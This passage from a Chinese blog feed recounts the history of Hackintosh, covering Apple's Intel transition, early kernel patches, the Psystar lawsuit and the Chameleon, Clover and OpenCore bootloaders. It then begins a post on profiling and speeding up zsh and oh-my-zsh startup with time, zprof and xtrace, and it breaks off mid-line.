CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> 